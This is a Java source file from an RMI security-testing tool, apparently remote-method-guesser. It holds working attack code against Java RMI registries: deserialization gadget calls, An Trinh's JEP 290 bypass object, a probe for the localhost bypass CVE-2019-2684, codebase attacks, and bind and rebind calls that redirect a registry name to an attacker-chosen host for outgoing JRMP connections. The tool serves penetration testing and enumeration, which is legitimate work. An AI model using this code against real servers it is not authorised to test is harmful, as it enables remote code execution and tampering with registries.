package de.qtc.rmg.operations;

import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import javax.management.remote.rmi.RMIServerImpl_Stub;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.DummySocketFactory;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * The RegistryClient class provides different methods to communicate with an RMI registry. The supported RMI
 * calls are dispatched manually, which allows modifications on the call level. The RMI target is taken from the
 * supplied RMIWhisperer, which allows to skip all the TLS and host redirection stuff.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;
    private Field enableReplaceField;

    private static final long interfaceHash = 4905912898345647071L;
    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};
    private static final long[] hashCodes = new long[] {7583982177005850366L, 2571371476350237748L, -7538657168040752697L, -8381844669958460146L, 7305022919901907578L };

    /**
     * Initializes the class and makes some required fields accessible by using reflection. These fields are
     * actually only required by some of the provided functions and the reflection is contained within the constructor
     * for legacy reasons. However, it shouldn't hurt.
     *
     * @param rmiRegistry RMIWhisperer object that represents the targeted RMI registry
     */
    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;

        try {
            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplaceField.setAccessible(true);

        } catch(SecurityException | NoSuchFieldException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    public void bindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Binding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = generateRMIServerImpl(host, port);
        } catch(Exception e) {
            ExceptionHandler.internalException(e, "RegistryClient.bindObject", true);
        }

        try {
            bindCall(boundName, payloadObject, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
            Logger.printlnMixedYellow("Bind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "bind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "bind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else if( t instanceof java.rmi.AlreadyBoundException) {
                ExceptionHandler.alreadyBoundException(e, boundName);

            } else {
                ExceptionHandler.unexpectedException(e, "bind", "call", false);
            }

        } catch( java.rmi.AlreadyBoundException e ) {
            ExceptionHandler.alreadyBoundException(e, boundName);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "bind", "call", false);
        }
    }

    public void rebindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Rebinding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = generateRMIServerImpl(host, port);

        } catch(Exception e) {
            ExceptionHandler.internalException(e, "RegistryClient.rebindObject", true);
        }

        try {
            rebindCall(boundName, payloadObject, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
            Logger.printlnMixedYellow("Rebind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "rebind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "rebind");

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Rebind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else {
                ExceptionHandler.unexpectedException(e, "rebind", "call", false);
            }

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "rebind", "call", false);
        }
    }

    public void unbindObject(String boundName, boolean localhostBypass)
    {
        Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
        Logger.println("");
        Logger.increaseIndent();

        try {
            unbindCall(boundName, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
            Logger.printlnMixedYellow("Unbind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, "unbind", localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.eprintlnMixedYellow("Caught", "NotBoundException", "during unbind call.");
            Logger.printlnMixedBlue("The name", boundName, "seems not to be bound to the registry.");

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);
        }
    }

    /**
     * Invokes the .lookup(String name) method of the RMI registry with a malformed codebase address and an
     * Integer as argument. Registry servers that use readObject() for unmarshalling the String type and that
     * are configured with useCodebaseOnly=false will attempt to parse the provided codebase as URL and throw
     * an according exception. With useCodebaseOnly=true, the malformed codebase is read too, but ignored afterwards.
     * This allows to detect whether the server runs with useCodebaseOnly=false.
     *
     * @param marshal  indicates whether the registry server uses readObject() to unmarshall Strings (true)
     * @param regMethod  the registry method to use for the operation (lookup|bind|rebind|unbind)
     */
    public void enumCodebase(boolean marshal, String regMethod, boolean localHostBypass)
    {
        Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        MaliciousOutputStream.setDefaultLocation("InvalidURL");

        try {

            callByName(regMethod, 0, true, localHostBypass, "");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.MalformedURLException ) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.lang.ClassCastException ) {
                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=true).");
                Logger.statusDefault();
                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
                ExceptionHandler.nonLocalhost(e, regMethod, localHostBypass);

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
            Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
            Logger.printlnPlainYellow("(useCodebaseOnly=true).");
            Logger.statusDefault();
            RMGUtils.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Determines how the String type is umarshalled by the remote server. Sends a java.lang.Integer as argument
     * for the lookup(String name) call. If the String type is read via readObject(), this will lead to an deserialization
     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
     * appears in the server exception, we know that readObject() was used. The readString() method, on the other hand,
     * ignores the location of an object.
     */
    public boolean enumerateStringMarshalling()
    {
        boolean marshal = false;

        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            lookupCall(0, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);
            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                Logger.printlnMixedBlue("- Server", "attempted to deserialize", "object locations during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                Logger.statusOutdated();
                RMGUtils.showStackTrace(e);
                marshal = true;

            } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.printlnMixedBlue("- Server complained that", "object cannot be casted to java.lang.String.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readString().");
                Logger.statusDefault();
                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.io.InvalidClassException ) {
                Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer");
                Logger.printlnPlainYellow(" (SingleEntryRegistry?).");
                Logger.println("  --> Unable to detect String marshalling on this registry type.");
                Logger.statusUndecided("Configuration");
                RMGUtils.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "lookup", "call", false);

        } finally {
            Logger.decreaseIndent();
        }

        return marshal;
    }

    public void enumLocalhostBypass()
    {
        Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
        Logger.println("");
        Logger.increaseIndent();

        try {
            unbindCall("If this name exists on the registry, it is definitely the maintainers fault...", false, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                Logger.statusOk();
                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, "unbind");

            } else {
                ExceptionHandler.unexpectedException(e, "unbind", "call", false);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.printMixedYellow("- Caught", "NotBoundException", "during unbind call ");
            Logger.printlnPlainBlue("(unbind was accepeted).");
            Logger.statusVulnerable();
            RMGUtils.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, "unbind", "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void enumJEP290Bypass(String regMethod, boolean localhostBypass, boolean marshal)
    {
        Logger.printlnBlue("RMI server JEP290 bypass enmeration:");
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "JEP 290 bypass", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        try {
            payloadObject = generateBypassObject("127.0.0.1", 1234567);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "pyload", "creation", true);
        }

        try {
            callByName(regMethod, payloadObject, false, localhostBypass, "");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);

            } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("Cannot modify this registry")) {
                ExceptionHandler.singleEntryRegistry(e, regMethod);

            } else if( t instanceof java.rmi.RemoteException ) {
                Logger.printMixedYellow("- Caught", "RemoteException", "after sending An Trinh gadget ");
                Logger.printlnPlainYellow("(An Trinh bypass patched).");
                RMGUtils.showStackTrace(e);
                Logger.statusOk();

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.IllegalArgumentException e ) {
            Logger.printlnMixedYellow("- Caught", "IllegalArgumentException", "after sending An Trinh gadget.");
            Logger.statusVulnerable();
            RMGUtils.showStackTrace(e);

        } catch( Exception e  ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void gadgetCall(Object payloadObject, String regMethod, boolean localHostBypass)
    {
        Logger.println("");
        Logger.printlnBlue("Attempting deserialization attack on RMI registry endpoint...");
        Logger.println("");
        Logger.increaseIndent();

        try {

            callByName(regMethod, payloadObject, false, localHostBypass, "");

        } catch( java.rmi.ServerException e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.jep290(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                Logger.printlnMixedYellow("Caught", "RemoteException", "during deserialization attack.");
                Logger.printMixedBlue("This is expected when", "An Trinh bypass", "was used and the server ");
                Logger.printlnPlainYellow("is patched.");

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    public void codebaseCall(Object payloadObject, String regMethod, boolean localHostBypass)
    {
        String className = payloadObject.getClass().getName();

        Logger.println("");
        Logger.printlnBlue("Attempting codebase attack on RMI registry endpoint...");
        Logger.print("Using class ");
        Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
        Logger.printlnPlainMixedYellow(" during", regMethod, "call.");
        Logger.println("");
        Logger.increaseIndent();

        try {

            callByName(regMethod, payloadObject, false, localHostBypass, "");

        } catch( java.rmi.ServerException e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "Registry", className);
                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.UnsupportedClassVersionError) {
                Logger.eprintlnMixedYellow("Caught", "UnsupportedClassVersionError", "during " + regMethod + " call.");
                Logger.eprintlnMixedBlue("You probably used an", "incompatible compiler", "for class generation.");
                Logger.eprintln("Original error: " + e.getMessage());
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, regMethod, "call");

            } else {
                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
        }
    }

    /*
    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
    *
    * @param host  listener address for the outgoing JRMP connection
    * @param port  listener port for the outgoing JRMP connection
    * @param regMethod  registry Method to use for the call
    */
    public static Object generateBypassObject(String host, int port) throws Exception
    {
        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
        constructor.setAccessible(true);

        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssfField.setAccessible(true);

        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }

    /**
     * Generates an RMIServerImpl_Stub as it is usually used by JMX instances. The contained TCPEndpoint
     * points to a user controlled address. This can be used for binding a malicious bound name to the
     * RMI registry. Once it is looked up, a JRMP connection is created to the specified TCPEndpoint.
     *
     * @param host  listener host for the outgoing JRMP connection
     * @param port  listener port for the outgoing JRMP connection
     * @return   RMIServerImpl_Stub as used by JMX
     * @throws Exception
     */
    public Object generateRMIServerImpl(String host, int port) throws Exception
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
        return new RMIServerImpl_Stub(refObject);
    }

    public void callByName(String callName, Object payloadObject, boolean maliciousStream, boolean bypass, String boundName) throws Exception
    {
        switch(callName) {

            case "lookup":
                lookupCall(payloadObject, maliciousStream);
                break;

            case "bind":
                bindCall(boundName, payloadObject, maliciousStream, bypass);
                break;

            case "rebind":
                rebindCall(boundName, payloadObject, maliciousStream, bypass);
                break;

            case "unbind":
                unbindCall(payloadObject, maliciousStream, bypass);
                break;

            default:
                ExceptionHandler.internalError("RegistryClient.callByName", "The function was called with an unknown callname");
        }
    }

    private void bindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {boundName, payloadObject};
        if(bypass)
            genericCall(-1, callArguments, maliciousStream, "bind");
        else
            genericCall(0, callArguments, maliciousStream);
    }

    private void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        genericCall(2, callArguments, maliciousStream);
    }

    private void rebindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {boundName, payloadObject};
        if(bypass)
            genericCall(-1, callArguments, maliciousStream, "rebind");
        else
            genericCall(3, callArguments, maliciousStream);
    }

    private void unbindCall(Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        if(bypass)
            genericCall(-1, callArguments, maliciousStream, "unbind");
        else
            genericCall(4, callArguments, maliciousStream);
    }

    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
    {
        genericCall(callID, callArguments, maliciousStream, null);
    }

    @SuppressWarnings("deprecation")
    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream, String callName) throws Exception
    {
        long hash = interfaceHash;

        if(callID >= 0) {
            callName = callNames[callID];

        } else if(callName != null){

            for(int ctr = 0; ctr < callNames.length; ctr++) {
                if( callName.equals(callNames[ctr]) ) {
                    hash = hashCodes[ctr];
                    break;
                }
            }

            if( hash == interfaceHash ) {
                ExceptionHandler.internalError("RegistryClient.genericCall", "Unable to find method hash for method '" + callName + "'.");
            }

        } else {
            ExceptionHandler.internalError("RegistryClient.genericCall", "Violation in the calling convention of the function.");
        }

        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, hash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                if(maliciousStream)
                    out = new MaliciousOutputStream(out);

                for(Object o : callArguments)
                    out.writeObject(o);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                ExceptionHandler.connectionRefused(e, callName, "call");

            } else {
                ExceptionHandler.unexpectedException(e, callName, "call", true);
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                ExceptionHandler.noRouteToHost(e, callName, "call");

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                ExceptionHandler.noJRMPServer(e, callName, "call");

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                ExceptionHandler.sslError(e, callName, "call");

            } else {
                ExceptionHandler.unexpectedException(e, callName, "call", true);
            }
        }
    }
}
